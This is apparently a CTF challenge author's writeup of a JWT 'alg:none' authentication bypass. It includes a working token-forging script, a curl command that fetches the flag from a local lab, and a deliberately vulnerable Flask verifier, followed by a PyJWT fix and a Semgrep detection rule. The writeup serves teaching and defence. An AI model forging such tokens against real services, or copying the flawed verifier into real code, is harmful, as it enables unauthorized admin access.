---
title: "Author's writeup: the JWT alg:none challenge I built for CSECcon"
date: 2026-11-29
type: writeup
summary: "How my CSECcon JWT challenge works, the intended solve, the root cause in one line, the fix, and a Semgrep rule that stops the bug coming back."
tags: [ctf, web, jwt, flask, appsec, semgrep]
platform: CSECcon (UTS CSEC)
difficulty: beginner
featured: true
draft: false
---

Most JWT writeups come from the attacker's side. I wrote this challenge, which meant writing the bug on purpose, and doing that made the root cause really obvious: the server let the token decide how it should be checked.

> [!NOTE]
> The code here is a trimmed-down version of the challenge. I ran every snippet as written: the forged token gets the flag from the vulnerable app, the fixed app returns 401, and the Semgrep rule only flags the unsafe code.

## The setup

Players get a small Flask app and a normal user's `session` cookie, which is a JWT. `/admin` hands over the flag, but only if the token's claims say `"role": "admin"`.

## The intended solve

1. Spot that the cookie is a JWT: three base64url chunks joined by dots. The first one decodes to `{"alg":"HS256","typ":"JWT"}`.
2. Decode the middle part and find `"role": "user"`.
3. Change the role to `admin` and send it back. 401, because the signature no longer matches. So the server does check signatures. Sometimes.
4. Set the header's `alg` to `none`, drop the signature, and try again.

```python title="forge.py"
import base64
import json


def b64url(obj: dict) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


header = {"alg": "none", "typ": "JWT"}
claims = {"sub": "player", "role": "admin"}

# alg:none means no signature, so the token ends with an empty third part
print(f"{b64url(header)}.{b64url(claims)}.")
```

```console
$ python3 forge.py
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJwbGF5ZXIiLCJyb2xlIjoiYWRtaW4ifQ.
$ curl -s -b "session=$(python3 forge.py)" http://localhost:5000/admin
CSEC{example_flag}
```

## The vulnerable code

```python title="vulnerable_app.py" {6-7}
def verify_token(token: str) -> dict:
    header_b64, payload_b64, sig_b64 = token.split(".")
    header = json.loads(b64url_decode(header_b64))

    # The bug: the token itself decides how it gets checked.
    if header.get("alg") == "none":
        return json.loads(b64url_decode(payload_b64))

    signing_input = f"{header_b64}.{payload_b64}".encode()
    expected = hmac.new(SECRET, signing_input, hashlib.sha256).digest()
    if not hmac.compare_digest(expected, b64url_decode(sig_b64)):
        abort(401)
    return json.loads(b64url_decode(payload_b64))
```

The HMAC check itself is fine. It even does a constant-time comparison. The problem is two lines earlier, where the attacker's own header decides whether that check runs at all.

## Root cause

The server lets untrusted input pick the security control. `none` is a real algorithm in the JWT standards (RFC 7518 defines it for unsecured tokens), so any verifier that reads `alg` from the token and does what it says will accept unsigned tokens.

The same shape turns up well outside JWTs: a request field that picks the authentication method, a role flag set on the client, a `debug` parameter. When I review code now, I ask one question of every check: who decides whether this runs?

## The fix

```python title="fixed_app.py"
import os

import jwt  # PyJWT
from flask import abort

SECRET = os.environ["JWT_SECRET"]


def verify_token(token: str) -> dict:
    try:
        # The server picks the algorithm. The token's header gets no say.
        return jwt.decode(token, SECRET, algorithms=["HS256"])
    except jwt.InvalidTokenError:
        abort(401)
```

It uses a maintained library instead of hand-rolled parsing, and it passes an explicit list of allowed algorithms, so PyJWT rejects the forged `alg: none` token and the app returns 401. The secret also comes from the environment now instead of sitting in the source.

## Stopping it coming back: a Semgrep rule

Fixing one file doesn't stop the next developer from writing the same bug. This rule catches the hand-rolled version, plus the two common PyJWT mistakes:

```yaml title="jwt-unverified.yaml"
rules:
  - id: jwt-signature-not-verified
    languages: [python]
    severity: ERROR
    message: >-
      This code can accept a JWT without a verified signature. Decode with a
      key and a fixed list of algorithms, e.g.
      jwt.decode(token, key, algorithms=["HS256"]).
    pattern-either:
      # PyJWT told to skip the signature check
      - pattern: 'jwt.decode(..., options={..., "verify_signature": False, ...}, ...)'
      # PyJWT allowed to accept unsigned tokens
      - pattern: 'jwt.decode(..., algorithms=[..., "none", ...], ...)'
      # Hand-rolled verifiers that trust the token's own alg header
      - pattern: '$HEADER.get("alg") == "none"'
      - pattern: '$HEADER["alg"] == "none"'
```

Against both versions, it only flags the vulnerable one:

```console
$ semgrep --config jwt-unverified.yaml vulnerable_app.py fixed_app.py

    vulnerable_app.py
   ❯❯❱ jwt-signature-not-verified
          This code can accept a JWT without a verified signature. ...

           22┆ if header.get("alg") == "none":
```

I also tried it on six small snippets. It flagged the four unsafe patterns and left `jwt.decode(t, key, algorithms=["HS256"])` alone, with or without extra `options`. In a real codebase I'd put this in CI, so a pull request that brings the bug back fails before a reviewer has to notice it.

## Why I designed it this way

It's aimed at beginners, so I kept to a few rules. Each step teaches one idea. The responses do some of the teaching too: a 401 for a bad signature and a 403 for the wrong role tell a player exactly which check they're hitting. And nothing relies on guessing. If you finish it, you understand the bug well enough to spot it in someone else's code.

## If you're a developer

- Never let a token choose its own algorithm.
- Use a maintained library and always pass `algorithms=` explicitly.
- Put a rule like the one above in CI so it can't sneak back in.
